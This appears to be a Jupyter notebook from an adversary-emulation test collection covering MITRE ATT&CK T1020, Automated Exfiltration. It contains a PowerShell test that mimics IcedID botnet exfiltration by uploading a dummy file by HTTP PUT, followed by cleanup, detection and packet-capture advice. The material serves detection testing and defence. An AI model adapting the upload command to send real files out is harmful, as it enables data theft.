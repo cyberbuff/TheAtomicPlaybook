{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8eeb3c54",
   "metadata": {},
   "source": "# T1020 - Automated Exfiltration\nAdversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)."
  },
  {
   "cell_type": "markdown",
   "id": "dae62f65",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "cba0855b",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - IcedID Botnet HTTP PUT",
    "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$fileName = \"C:\\temp\\T1020_exfilFile.txt\"\n$url = \"https://google.com\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "83d79d43",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1020 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "b25a3815",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$fileName = \"C:\\temp\\T1020_exfilFile.txt\"\nRemove-Item -Path $fileName -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d5fab861",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1020 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "64d8d8f7",
   "metadata": {},
   "source": "## Detection\nMonitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious."
  },
  {
   "cell_type": "markdown",
   "id": "7ca2d079",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### PCAP Collection \n Collect full network traffic for future research and analysis. \n\n PCAP Collection allows a defenders to use the data to examine an adversary\u2019s network traffic more closely, including studying if it is encoded and/or encrypted. PCAP can be run through tools to replay the traffic to get a real-time view of what happened over the wire. These tools can also parse the traffic and send results to a SIEM for monitoring and alerting.\n#### Opportunity\nThere is an opportunity to collect network data and analyze the adversary activity it contains.\n#### Use Case\nCollecting full packet capture of all network traffic allows you to review what happened over the connection and identify command and control traffic and/or exfiltration activity.\n#### Procedures\nCollect PCAP on a decoy network to improve visibility into an adversary's network activity.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}